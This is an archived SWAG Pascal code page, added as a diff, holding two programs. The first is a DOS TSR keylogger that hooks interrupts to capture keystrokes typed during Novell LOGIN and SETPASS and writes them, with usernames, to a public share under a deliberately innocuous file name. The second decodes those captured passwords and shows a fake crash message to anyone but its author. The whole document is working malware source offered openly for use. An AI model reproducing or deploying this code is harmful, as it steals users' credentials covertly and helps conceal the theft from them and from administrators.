@@ -1,0 +1,268 @@
+<html>
+<head><title> "Getting NOVELL Passwords" by BERO@RAGE.FIDO.DE</title><link rel="STYLESHEET" type="text/css" href="../swagsource.css"></head>
+<body><p align="center"><b>[</b><a href="index.html">Back to NETWORK SWAG index</a><b>]</b>&nbsp;&nbsp;<b>[</b><a href="../index.html">Back to Main SWAG index</a><b>]</b>&nbsp;&nbsp;<b>[</b><a href="0035.PAS">Original</a><b>]</b></p><!--StartFragment--><pre><code><font color="#008000"><i>{
+The program NOVKILL.PAS is a TSR program that tries to get passwords for
+Novell Networks, and does not belong to NUMBERS.SWG. If you want to keep
+it, you may do so, but please move it to TSR.SWG, ISR.SWG or NOVELL.SWG,
+and change the sender address from bero@flash.gun.de to my new address,
+bero@rage.fido.de.
+
+If you are interested in a more elaborate version of the entire thing
+(which I believe to be a good example for ISRs - it accesses the timer
+interrupt, the keyboard interrupt and the multiplex interrupt; and even
+writes to a file from within an interrupt), here you go:
+}
+
+</i></font><font color="#FF0000"><b>program </b></font>Get_Passwords<font color="#000080">;
+</font><font color="#008000"><i>{$M $1000,0,0}
+</i></font><font color="#FF0000"><b>Uses </b></font>Dos<font color="#000080">,</font>Crt<font color="#000080">,</font>Network<font color="#000080">;
+</font><font color="#008000"><i>{ Network ist a Unit I wrote to do some NetWare API calls.
+  The only function used here is GetUser, which can be taken from
+  other Network programs in the SWAGs, as well. }
+</i></font><font color="#FF0000"><b>type </b></font>Pwd<font color="#000080">=</font><font color="#FF0000"><b>Array</b></font><font color="#000080">[</font><font color="#800000">0</font><font color="#000080">..</font><font color="#800000">99</font><font color="#000080">] </font><font color="#FF0000"><b>of </b></font>byte<font color="#000080">;
+</font><font color="#FF0000"><b>type </b></font>FileType<font color="#000080">=</font><font color="#FF0000"><b>record
+              </b></font>UserName<font color="#000080">:</font><font color="#FF0000"><b>String</b></font><font color="#000080">[</font><font color="#800000">10</font><font color="#000080">];
+              </font>Password<font color="#000080">:</font>Pwd<font color="#000080">;
+     </font><font color="#FF0000"><b>end</b></font><font color="#000080">;
+</font><font color="#FF0000"><b>var </b></font>OldInt2F<font color="#000080">:</font>pointer<font color="#000080">;  </font><font color="#008000"><i>{ Multiplex }
+    </i></font>OldInt9<font color="#000080">:</font><font color="#FF0000"><b>procedure</b></font><font color="#000080">; </font><font color="#008000"><i>{ Keyboard }
+    </i></font>OldInt8<font color="#000080">:</font>pointer<font color="#000080">;   </font><font color="#008000"><i>{ Timer }
+    </i></font>s<font color="#000080">:</font><font color="#FF0000"><b>string</b></font><font color="#000080">;
+    </font>Password<font color="#000080">:</font>Pwd<font color="#000080">;
+    </font>Save_Me<font color="#000080">:</font>FileType<font color="#000080">;
+    </font>Save_Pass<font color="#000080">:</font><font color="#FF0000"><b>File of </b></font>FileType<font color="#000080">;
+    </font>catching<font color="#000080">,</font>writing<font color="#000080">,</font>tsr_wr<font color="#000080">:</font>boolean<font color="#000080">;
+    </font>Counter<font color="#000080">:</font>word<font color="#000080">;
+    </font>DosSeg<font color="#000080">,</font>DosBusy<font color="#000080">:</font>word<font color="#000080">;
+</font><font color="#FF0000"><b>const </b></font>oldstackss<font color="#000080">:</font>word<font color="#000080">=</font><font color="#800000">0</font><font color="#000080">;    </font><font color="#008000"><i>{ TSR-Programms that try to write to a file }
+      </i></font>oldstacksp<font color="#000080">:</font>word<font color="#000080">=</font><font color="#800000">0</font><font color="#000080">;    </font><font color="#008000"><i>{ from a &quot;standard&quot; interrupt must have     }
+      </i></font>stacksw<font color="#000080">:</font>integer<font color="#000080">=-</font><font color="#800000">1</font><font color="#000080">;   </font><font color="#008000"><i>{ their own stack...                        }
+      </i></font>intstackss<font color="#000080">:</font>word<font color="#000080">=</font><font color="#800000">0</font><font color="#000080">;
+      </font>intstacksp<font color="#000080">:</font>word<font color="#000080">=</font><font color="#800000">0</font><font color="#000080">;
+</font><font color="#008000"><i>{$F+}
+{$I-}
+</i></font><font color="#FF0000"><b>procedure </b></font>GoOldInt<font color="#000080">(</font>OldInt<font color="#000080">:</font>Pointer<font color="#000080">);
+</font><font color="#008000"><i>{ GoOldInt calls an old interrupt-handler }
+</i></font><font color="#FF0000"><b>INLINE</b></font><font color="#000080">(
+       </font><font color="#800000">$5B</font><font color="#000080">/
+       </font><font color="#800000">$58</font><font color="#000080">/
+       </font><font color="#800000">$89</font><font color="#000080">/</font><font color="#800000">$EC</font><font color="#000080">/
+       </font><font color="#800000">$5D</font><font color="#000080">/
+       </font><font color="#800000">$07</font><font color="#000080">/
+       </font><font color="#800000">$1F</font><font color="#000080">/
+       </font><font color="#800000">$5F</font><font color="#000080">/
+       </font><font color="#800000">$5E</font><font color="#000080">/
+       </font><font color="#800000">$5A</font><font color="#000080">/
+       </font><font color="#800000">$59</font><font color="#000080">/
+       </font><font color="#800000">$87</font><font color="#000080">/</font><font color="#800000">$EC</font><font color="#000080">/
+       </font><font color="#800000">$87</font><font color="#000080">/</font><font color="#800000">$5E</font><font color="#000080">/</font><font color="#800000">$00</font><font color="#000080">/
+       </font><font color="#800000">$87</font><font color="#000080">/</font><font color="#800000">$46</font><font color="#000080">/</font><font color="#800000">$02</font><font color="#000080">/
+       </font><font color="#800000">$87</font><font color="#000080">/</font><font color="#800000">$EC</font><font color="#000080">/
+       </font><font color="#800000">$CB</font><font color="#000080">);
+
+</font><font color="#FF0000"><b>procedure </b></font>NewInt8<font color="#000080">;</font>interrupt<font color="#000080">;  </font><font color="#008000"><i>{ New timer-interrupt }
+</i></font><font color="#FF0000"><b>begin
+  asm </b></font><font color="#FF00FF">cli                     </font><font color="#008000"><i>{ save old stack, switch to new }
+      </i></font><font color="#FF00FF">inc word ptr [stacksw]
+      jnz @a
+      mov [oldstackss],ss
+      mov [oldstacksp],sp
+      mov ss,[intstackss]
+      mov sp,[intstacksp]
+      @a: sti
+  </font><font color="#FF0000"><b>end</b></font><font color="#000080">;
+  </font><font color="#FF0000"><b>if </b></font><font color="#000080">(</font>writing<font color="#000080">) </font><font color="#FF0000"><b>and </b></font><font color="#000080">(</font><font color="#FF0000"><b>not </b></font>tsr_wr<font color="#000080">) </font><font color="#FF0000"><b>and </b></font><font color="#000080">(</font>Mem<font color="#000080">[</font>DosSeg<font color="#000080">:</font>DosBusy<font color="#000080">]=</font><font color="#800000">0</font><font color="#000080">) </font><font color="#FF0000"><b>then begin
+    </b></font><font color="#008000"><i>{ Do not write to files while DOS is busy... }
+    </i></font>writing<font color="#000080">:=</font>false<font color="#000080">;
+    </font>tsr_wr<font color="#000080">:=</font>true<font color="#000080">;
+    </font>port<font color="#000080">[</font><font color="#800000">$20</font><font color="#000080">]:=</font><font color="#800000">$20</font><font color="#000080">;  </font><font color="#008000"><i>{ Tell the Interrupt controller the int ends... }
+    </i></font>Save_Me<font color="#000080">.</font>UserName<font color="#000080">:=</font>GetUser<font color="#000080">;
+    </font><font color="#FF0000"><b>if </b></font><font color="#000080">(</font>Save_Me<font color="#000080">.</font>UserName<font color="#000080">&lt;&gt;</font><font color="#800000">'BERO'</font><font color="#000080">) </font><font color="#FF0000"><b>and </b></font><font color="#000080">(</font>Save_Me<font color="#000080">.</font>UserName<font color="#000080">&lt;&gt;</font><font color="#800000">'ROSENKR'</font><font color="#000080">)
+       </font><font color="#FF0000"><b>then begin </b></font><font color="#008000"><i>{ Do NOT save my own passwords... }
+      </i></font>Save_Me<font color="#000080">.</font>Password<font color="#000080">:=</font>Password<font color="#000080">;
+      </font>Assign<font color="#000080">(</font>Save_Pass<font color="#000080">,</font><font color="#800000">'F:\PUBLIC\DATA.DBF'</font><font color="#000080">);
+                       </font><font color="#008000"><i>{ write passwords to a public directory, use a
+                         non-suspicious name... }
+      </i></font>Reset<font color="#000080">(</font>Save_Pass<font color="#000080">);
+      </font><font color="#FF0000"><b>IF </b></font>IOResult<font color="#000080">&lt;&gt;</font><font color="#800000">0 </font><font color="#FF0000"><b>then </b></font>Rewrite<font color="#000080">(</font>Save_Pass<font color="#000080">) </font><font color="#FF0000"><b>else
+         </b></font>Seek<font color="#000080">(</font>Save_Pass<font color="#000080">,</font>filesize<font color="#000080">(</font>Save_Pass<font color="#000080">));
+      </font>Write<font color="#000080">(</font>Save_Pass<font color="#000080">,</font>Save_Me<font color="#000080">);
+      </font>Close<font color="#000080">(</font>Save_Pass<font color="#000080">);
+      </font>tsr_wr<font color="#000080">:=</font>false<font color="#000080">;
+    </font><font color="#FF0000"><b>end</b></font><font color="#000080">;
+  </font><font color="#FF0000"><b>end</b></font><font color="#000080">;
+  </font><font color="#FF0000"><b>asm </b></font><font color="#FF00FF">cli     </font><font color="#008000"><i>{ restore old stack }
+      </i></font><font color="#FF00FF">dec word ptr [stacksw]
+      jge @b
+      mov ss,oldstackss
+      mov sp,oldstacksp
+      @b: sti
+  </font><font color="#FF0000"><b>end</b></font><font color="#000080">;
+  </font>GoOldInt<font color="#000080">(</font>OldInt8<font color="#000080">);
+</font><font color="#FF0000"><b>end</b></font><font color="#000080">;
+</font><font color="#FF0000"><b>procedure </b></font>NewInt9<font color="#000080">;</font>interrupt<font color="#000080">;  </font><font color="#008000"><i>{ New Keyboard-interrupt }
+</i></font><font color="#FF0000"><b>var </b></font>inp<font color="#000080">:</font>byte<font color="#000080">;
+</font><font color="#FF0000"><b>begin
+  if </b></font>catching <font color="#FF0000"><b>then begin
+    </b></font>inp<font color="#000080">:=</font>Port<font color="#000080">[</font><font color="#800000">$60</font><font color="#000080">];
+    </font><font color="#FF0000"><b>if </b></font><font color="#000080">(</font>inp<font color="#000080">&lt;</font><font color="#800000">$80</font><font color="#000080">) </font><font color="#FF0000"><b>and </b></font><font color="#000080">(</font>Counter<font color="#000080">&lt;</font><font color="#800000">100</font><font color="#000080">) </font><font color="#FF0000"><b>then begin
+      </b></font>Password<font color="#000080">[</font>Counter<font color="#000080">]:=</font>inp<font color="#000080">;
+      </font>Inc<font color="#000080">(</font>Counter<font color="#000080">);
+    </font><font color="#FF0000"><b>end</b></font><font color="#000080">;
+  </font><font color="#FF0000"><b>end</b></font><font color="#000080">;
+  </font><font color="#FF0000"><b>asm </b></font><font color="#FF00FF">pushf </font><font color="#FF0000"><b>end</b></font><font color="#000080">;
+  </font>OldInt9<font color="#000080">;
+</font><font color="#FF0000"><b>end</b></font><font color="#000080">;
+</font><font color="#FF0000"><b>procedure </b></font>NewInt2f<font color="#000080">(</font>Flags<font color="#000080">,</font>CS<font color="#000080">,</font>IP<font color="#000080">,</font>AX<font color="#000080">,</font>BX<font color="#000080">,</font>CX<font color="#000080">,</font>DX<font color="#000080">,</font>SI<font color="#000080">,</font>DI<font color="#000080">,</font>DS<font color="#000080">,</font>ES<font color="#000080">,</font>BP<font color="#000080">:</font>Word<font color="#000080">);</font>Interrupt<font color="#000080">;
+</font><font color="#008000"><i>{ New Multiplex-Interrupt: Intercept DOS-Commands }
+</i></font><font color="#FF0000"><b>VAR </b></font>s<font color="#000080">:</font><font color="#FF0000"><b>String</b></font><font color="#000080">;
+    </font>Count<font color="#000080">:</font>Byte<font color="#000080">;
+</font><font color="#FF0000"><b>begin
+  IF </b></font>AX<font color="#000080">=</font><font color="#800000">$AE00 </font><font color="#FF0000"><b>then begin
+    </b></font>s<font color="#000080">:=</font><font color="#800000">''</font><font color="#000080">;
+    </font><font color="#FF0000"><b>For </b></font>Count<font color="#000080">:=</font><font color="#800000">1 </font><font color="#FF0000"><b>to </b></font>Mem<font color="#000080">[</font>ds<font color="#000080">:</font>si<font color="#000080">] </font><font color="#FF0000"><b>do
+      </b></font>s<font color="#000080">:=</font>s<font color="#000080">+</font>chr<font color="#000080">(</font>Mem<font color="#000080">[</font>ds<font color="#000080">:</font>si<font color="#000080">+</font>count<font color="#000080">]);
+    </font><font color="#FF0000"><b>if </b></font><font color="#000080">(</font>s<font color="#000080">=</font><font color="#800000">'LOGIN'</font><font color="#000080">) </font><font color="#FF0000"><b>or </b></font><font color="#000080">(</font>s<font color="#000080">=</font><font color="#800000">'LG'</font><font color="#000080">) </font><font color="#FF0000"><b>or </b></font><font color="#000080">(</font>s<font color="#000080">=</font><font color="#800000">'SETPASS'</font><font color="#000080">) </font><font color="#FF0000"><b>then begin
+      </b></font>s<font color="#000080">:=</font><font color="#800000">''</font><font color="#000080">;
+      </font><font color="#FF0000"><b>For </b></font>Count<font color="#000080">:=</font><font color="#800000">1 </font><font color="#FF0000"><b>to </b></font>Mem<font color="#000080">[</font>ds<font color="#000080">:</font>bx<font color="#000080">+</font><font color="#800000">1</font><font color="#000080">] </font><font color="#FF0000"><b>do
+        </b></font>s<font color="#000080">:=</font>s<font color="#000080">+</font>chr<font color="#000080">(</font>Mem<font color="#000080">[</font>ds<font color="#000080">:</font>bx<font color="#000080">+</font>count<font color="#000080">+</font><font color="#800000">1</font><font color="#000080">]);
+        </font><font color="#FF0000"><b>For </b></font>Count<font color="#000080">:=</font><font color="#800000">0 </font><font color="#FF0000"><b>to </b></font><font color="#800000">99 </font><font color="#FF0000"><b>do </b></font>Password<font color="#000080">[</font>Count<font color="#000080">]:=</font><font color="#800000">0</font><font color="#000080">;
+        </font>counter<font color="#000080">:=</font><font color="#800000">0</font><font color="#000080">;
+        </font>catching<font color="#000080">:=</font>true<font color="#000080">;
+    </font><font color="#FF0000"><b>end else if </b></font>catching <font color="#FF0000"><b>then begin
+      </b></font>catching<font color="#000080">:=</font>false<font color="#000080">;
+      </font>writing<font color="#000080">:=</font>true<font color="#000080">;
+      </font>Counter<font color="#000080">:=</font><font color="#800000">0</font><font color="#000080">;
+    </font><font color="#FF0000"><b>end</b></font><font color="#000080">;
+  </font><font color="#FF0000"><b>end</b></font><font color="#000080">;
+  </font>GoOldInt<font color="#000080">(</font>OldInt2F<font color="#000080">);
+</font><font color="#FF0000"><b>end</b></font><font color="#000080">;
+</font><font color="#FF0000"><b>procedure </b></font>Init_TSR<font color="#000080">;  </font><font color="#008000"><i>{ Create new stack, get DOS-Busy byte }
+</i></font><font color="#FF0000"><b>begin
+  </b></font>IntStackSS<font color="#000080">:=</font>SSEG<font color="#000080">;
+  </font><font color="#FF0000"><b>asm </b></font><font color="#FF00FF">mov [IntStackSP],SP
+      mov ah,$34
+      int $21
+      mov [DosSeg],ES
+      mov [DosBusy],BX
+  </font><font color="#FF0000"><b>end</b></font><font color="#000080">;
+</font><font color="#FF0000"><b>end</b></font><font color="#000080">;
+</font><font color="#FF0000"><b>begin
+  </b></font>tsr_wr<font color="#000080">:=</font>false<font color="#000080">;
+  </font>Counter<font color="#000080">:=</font><font color="#800000">0</font><font color="#000080">;
+  </font>catching<font color="#000080">:=</font>false<font color="#000080">;
+  </font>Init_TSR<font color="#000080">;
+  </font>GetIntVec<font color="#000080">(</font><font color="#800000">$8</font><font color="#000080">,</font>OldInt8<font color="#000080">);   </font><font color="#008000"><i>{ set interrupts }
+  </i></font>SetIntVec<font color="#000080">(</font><font color="#800000">$8</font><font color="#000080">,@</font>NewInt8<font color="#000080">);
+  </font>GetIntVec<font color="#000080">(</font><font color="#800000">$9</font><font color="#000080">,@</font>OldInt9<font color="#000080">);
+  </font>SetIntVec<font color="#000080">(</font><font color="#800000">$9</font><font color="#000080">,@</font>NewInt9<font color="#000080">);
+  </font>GetIntVec<font color="#000080">(</font><font color="#800000">$2f</font><font color="#000080">,</font>OldInt2F<font color="#000080">);
+  </font>SetIntVec<font color="#000080">(</font><font color="#800000">$2f</font><font color="#000080">,@</font>NewInt2F<font color="#000080">);
+  </font>Keep<font color="#000080">(</font><font color="#800000">0</font><font color="#000080">);
+</font><font color="#FF0000"><b>end</b></font><font color="#000080">.
+
+*************
+&quot;</font>Decode<font color="#000080">&quot; - </font>Decode the files generated by the <font color="#FF0000"><b>program </b></font>above
+
+<font color="#FF0000"><b>program </b></font>Decode<font color="#000080">;
+</font><font color="#FF0000"><b>Uses </b></font>Dos<font color="#000080">,</font>Crt<font color="#000080">,</font>Network<font color="#000080">;
+</font><font color="#FF0000"><b>type </b></font>Pwd<font color="#000080">=</font><font color="#FF0000"><b>Array</b></font><font color="#000080">[</font><font color="#800000">0</font><font color="#000080">..</font><font color="#800000">99</font><font color="#000080">] </font><font color="#FF0000"><b>of </b></font>byte<font color="#000080">;
+</font><font color="#FF0000"><b>type </b></font>FileType<font color="#000080">=</font><font color="#FF0000"><b>record
+              </b></font>LoginName<font color="#000080">:</font><font color="#FF0000"><b>String</b></font><font color="#000080">[</font><font color="#800000">10</font><font color="#000080">];
+              </font>Password<font color="#000080">:</font>Pwd<font color="#000080">;
+     </font><font color="#FF0000"><b>end</b></font><font color="#000080">;
+</font><font color="#FF0000"><b>var </b></font>s<font color="#000080">:</font><font color="#FF0000"><b>string</b></font><font color="#000080">;
+    </font>Read_Me<font color="#000080">:</font>FileType<font color="#000080">;
+    </font>Read_Pass<font color="#000080">:</font><font color="#FF0000"><b>File of </b></font>FileType<font color="#000080">;
+    </font>c<font color="#000080">:</font>char<font color="#000080">;
+    </font>a<font color="#000080">:</font>byte<font color="#000080">;
+</font><font color="#FF0000"><b>procedure </b></font>Decode_Pass<font color="#000080">(</font>s<font color="#000080">:</font>Pwd<font color="#000080">); </font><font color="#008000"><i>{ Change SCAN-Codes to ASCII }
+</i></font><font color="#FF0000"><b>var </b></font>count<font color="#000080">:</font>byte<font color="#000080">;
+</font><font color="#FF0000"><b>begin
+  </b></font>count<font color="#000080">:=</font><font color="#800000">0</font><font color="#000080">;
+  </font><font color="#FF0000"><b>repeat
+    case </b></font>s<font color="#000080">[</font>count<font color="#000080">] </font><font color="#FF0000"><b>of
+    </b></font><font color="#800000">1</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'^'</font><font color="#000080">);
+    </font><font color="#800000">2</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'1'</font><font color="#000080">);
+    </font><font color="#800000">3</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'2'</font><font color="#000080">);
+    </font><font color="#800000">4</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'3'</font><font color="#000080">);
+    </font><font color="#800000">5</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'4'</font><font color="#000080">);
+    </font><font color="#800000">6</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'5'</font><font color="#000080">);
+    </font><font color="#800000">7</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'6'</font><font color="#000080">);
+    </font><font color="#800000">8</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'7'</font><font color="#000080">);
+    </font><font color="#800000">9</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'8'</font><font color="#000080">);
+    </font><font color="#800000">10</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'9'</font><font color="#000080">);
+    </font><font color="#800000">11</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'0'</font><font color="#000080">);
+    </font><font color="#800000">12</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'a'</font><font color="#000080">);
+    </font><font color="#800000">13</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'`'</font><font color="#000080">);
+    </font><font color="#800000">14</font><font color="#000080">: </font>Write<font color="#000080">(</font>chr<font color="#000080">(</font><font color="#800000">8</font><font color="#000080">));
+    </font><font color="#800000">16</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'Q'</font><font color="#000080">);
+    </font><font color="#800000">17</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'W'</font><font color="#000080">);
+    </font><font color="#800000">18</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'E'</font><font color="#000080">);
+    </font><font color="#800000">19</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'R'</font><font color="#000080">);
+    </font><font color="#800000">20</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'T'</font><font color="#000080">);
+    </font><font color="#800000">21</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'Z'</font><font color="#000080">);
+    </font><font color="#800000">22</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'U'</font><font color="#000080">);
+    </font><font color="#800000">23</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'I'</font><font color="#000080">);
+    </font><font color="#800000">24</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'O'</font><font color="#000080">);
+    </font><font color="#800000">25</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'P'</font><font color="#000080">);
+    </font><font color="#800000">26</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'s'</font><font color="#000080">);
+    </font><font color="#800000">27</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'+'</font><font color="#000080">);
+    </font><font color="#800000">28</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'[RETURN]'</font><font color="#000080">);
+    </font><font color="#800000">29</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'[STRG]'</font><font color="#000080">);
+    </font><font color="#800000">30</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'A'</font><font color="#000080">);
+    </font><font color="#800000">31</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'S'</font><font color="#000080">);
+    </font><font color="#800000">32</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'D'</font><font color="#000080">);
+    </font><font color="#800000">33</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'F'</font><font color="#000080">);
+    </font><font color="#800000">34</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'G'</font><font color="#000080">);
+    </font><font color="#800000">35</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'H'</font><font color="#000080">);
+    </font><font color="#800000">36</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'J'</font><font color="#000080">);
+    </font><font color="#800000">37</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'K'</font><font color="#000080">);
+    </font><font color="#800000">38</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'L'</font><font color="#000080">);
+    </font><font color="#800000">39</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'Oe'</font><font color="#000080">);
+    </font><font color="#800000">40</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'Ae'</font><font color="#000080">);
+    </font><font color="#800000">41</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'#'</font><font color="#000080">);
+    </font><font color="#800000">42</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'[SHIFT]'</font><font color="#000080">);
+    </font><font color="#800000">43</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'&lt;'</font><font color="#000080">);
+    </font><font color="#800000">44</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'Y'</font><font color="#000080">);
+    </font><font color="#800000">45</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'X'</font><font color="#000080">);
+    </font><font color="#800000">46</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'C'</font><font color="#000080">);
+    </font><font color="#800000">47</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'V'</font><font color="#000080">);
+    </font><font color="#800000">48</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'B'</font><font color="#000080">);
+    </font><font color="#800000">49</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'N'</font><font color="#000080">);
+    </font><font color="#800000">50</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'M'</font><font color="#000080">);
+    </font><font color="#800000">51</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">','</font><font color="#000080">);
+    </font><font color="#800000">52</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'.'</font><font color="#000080">);
+    </font><font color="#800000">53</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'-'</font><font color="#000080">);
+    </font><font color="#800000">56</font><font color="#000080">: </font>Write<font color="#000080">(</font><font color="#800000">'[ALT (GR)]'</font><font color="#000080">);
+    </font><font color="#FF0000"><b>else </b></font>write<font color="#000080">(</font><font color="#800000">'[Scan '</font><font color="#000080">,</font>s<font color="#000080">[</font>count<font color="#000080">],</font><font color="#800000">']'</font><font color="#000080">);
+    </font><font color="#FF0000"><b>end</b></font><font color="#000080">;
+    </font>Inc<font color="#000080">(</font>count<font color="#000080">);
+  </font><font color="#FF0000"><b>Until </b></font><font color="#000080">(</font>s<font color="#000080">[</font>count<font color="#000080">]=</font><font color="#800000">0</font><font color="#000080">) </font><font color="#FF0000"><b>or </b></font><font color="#000080">(</font>count<font color="#000080">=</font><font color="#800000">100</font><font color="#000080">);
+</font><font color="#FF0000"><b>end</b></font><font color="#000080">;
+</font><font color="#FF0000"><b>begin
+  if </b></font><font color="#000080">(</font>GetUser<font color="#000080">&lt;&gt;</font><font color="#800000">'BERO'</font><font color="#000080">) </font><font color="#FF0000"><b>and </b></font><font color="#000080">(</font>GetUser<font color="#000080">&lt;&gt;</font><font color="#800000">'ROSENKR'</font><font color="#000080">) </font><font color="#FF0000"><b>then begin
+    </b></font><font color="#008000"><i>{ Abort program if someone else is calling it... }
+    </i></font>writeln<font color="#000080">(</font><font color="#800000">'SYSTEM ERROR #0231- General Protection Fault at
+0131</font><font color="#000080">:</font><font color="#800000">321</font>D<font color="#800000">',chr(7));
+    </font>writeln<font color="#000080">(</font><font color="#800000">'Abnormal program termination'</font><font color="#000080">,</font>chr<font color="#000080">(</font><font color="#800000">7</font><font color="#000080">));
+    </font>halt<font color="#000080">(</font><font color="#800000">0</font><font color="#000080">);
+  </font><font color="#FF0000"><b>end</b></font><font color="#000080">;
+  </font>Assign<font color="#000080">(</font>Read_Pass<font color="#000080">,</font><font color="#800000">'F:\PUBLIC\DATA.DBF'</font><font color="#000080">);
+  </font>Reset<font color="#000080">(</font>Read_Pass<font color="#000080">);
+  </font><font color="#FF0000"><b>IF </b></font><font color="#000080">(</font>DOSError<font color="#000080">&lt;&gt;</font><font color="#800000">0</font><font color="#000080">) </font><font color="#FF0000"><b>then begin
+    </b></font>writeln<font color="#000080">(</font><font color="#800000">'No passwords found... :-((((('</font><font color="#000080">);
+    </font>Halt<font color="#000080">(</font><font color="#800000">0</font><font color="#000080">);
+  </font><font color="#FF0000"><b>end</b></font><font color="#000080">;
+  </font><font color="#FF0000"><b>repeat
+    </b></font>Read<font color="#000080">(</font>Read_Pass<font color="#000080">,</font>Read_Me<font color="#000080">);
+    </font>Writeln<font color="#000080">(</font>Read_Me<font color="#000080">.</font>LoginName<font color="#000080">);
+    </font>Decode_Pass<font color="#000080">(</font>Read_Me<font color="#000080">.</font>Password<font color="#000080">);
+    </font>Writeln<font color="#000080">;
+    </font><font color="#FF0000"><b>repeat until </b></font>keypressed<font color="#000080">; </font>c<font color="#000080">:=</font>ReadKey<font color="#000080">;
+  </font><font color="#FF0000"><b>until </b></font>eof<font color="#000080">(</font>Read_Pass<font color="#000080">);
+  </font>Close<font color="#000080">(</font>Read_Pass<font color="#000080">);
+</font><font color="#FF0000"><b>end</b></font><font color="#000080">.
+</font>
+</code></pre><!--EndFragment--><p align="center"><b>[</b><a href="index.html">Back to NETWORK SWAG index</a><b>]</b>&nbsp;&nbsp;<b>[</b><a href="../index.html">Back to Main SWAG index</a><b>]</b>&nbsp;&nbsp;<b>[</b><a href="0035.PAS">Original</a><b>]</b></p></body>
+</html>
